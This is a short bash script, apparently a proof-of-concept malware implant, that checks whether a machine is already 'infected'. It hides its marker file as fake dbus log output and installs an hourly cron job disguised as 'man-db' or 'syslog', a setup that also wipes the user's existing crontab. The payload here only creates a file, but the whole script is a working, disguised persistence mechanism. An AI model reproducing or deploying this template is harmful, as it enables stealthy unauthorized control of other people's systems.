#!/bin/bash

# Check if the machine has already been infected

USER=`whoami`
FILENAME=".dbus-update-errors"
FILESYSTEM_FILE="$HOME/$FILENAME"

MSG="dbus-update-activation-environment: setting DISPLAY=:0 \n
dbus-update-activation-environment: setting XAUTHORITY=/home/$USER/.Xauthority \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting SHELL=/bin/bash \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0 \n
dbus-update-activation-environment: setting PWD=`pwd` \n
dbus-update-activation-environment: setting GDM_LANG=en_US \n
dbus-update-activation-environment: setting HOME=$HOME \n
dbus-update-activation-environment: setting IM_CONFIG_PHASE=1 \n
dbus-update-activation-environment: setting LANG=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_PAPER=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_NUMERIC=en_US.UTF-8 \n
dbus-update-activation-environment: setting _=/usr/bin/dbus-update-activation-environment \n"

SCRIPT_CONTENT="#!/bin/bash \n
touch $HOME/Hi_ITS_ME \n"

if [ ! -f "$FILESYSTEM_FILE" ]; then
	echo -e $MSG > $FILESYSTEM_FILE # Use touch to modify the dates?
else
	exit
fi


# We only proceed if it hasn't been infected

if [ $USER == "root" ] && [ -d "/etc/cron.hourly" ]; then # Write in /etc/cron.hourly
	echo "if"
	
	SCRIPT_NAME="man-db" # Careful with name, otherwise it won't be run by cron
	# run-parts --test /etc/cron.hourly to test it
	SCRIPT_PATH="/etc/cron.hourly/$SCRIPT_NAME"
	echo -e $SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
else # Create an entry in crontab
	echo "else"
	
	SCRIPT_NAME="syslog"
	SCRIPT_PATH="$HOME/$SCRIPT_NAME"	
	echo -e $SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
	# Maybe do some fancy and fun stuff...
	EDITOR="vi"
	(crontab -l | echo -e "0 * * * * $SCRIPT_PATH") | crontab -
	
fi

